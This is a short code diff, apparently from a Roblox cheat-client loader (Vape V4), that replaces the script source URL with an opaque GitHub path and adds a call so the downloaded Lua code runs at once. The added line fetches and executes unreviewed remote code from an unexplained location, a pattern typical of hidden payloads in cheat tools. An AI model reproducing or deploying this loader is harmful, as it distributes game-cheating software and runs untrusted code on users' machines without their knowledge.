@@ -106,7 +106,7 @@ local DCP = UserInputService.KeyboardEnabled
 local DCU = nil
 
 if DCM then
-    DCU = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))
+    DCU = loadstring(game:HttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/Purple-theme/main/test", true))()
 elseif DCP then
     DCU = loadfile('vape/NewMainScript.lua')
 end
